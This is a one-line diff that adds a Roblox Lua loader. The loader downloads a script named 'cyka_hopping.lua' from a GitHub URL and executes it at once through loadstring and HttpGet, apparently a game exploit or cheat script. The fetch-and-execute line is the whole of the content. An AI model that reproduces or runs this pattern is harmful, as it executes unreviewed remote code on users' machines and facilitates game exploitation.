@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Margeshy/cyka-hopping/refs/heads/main/cyka_hopping.lua"))()
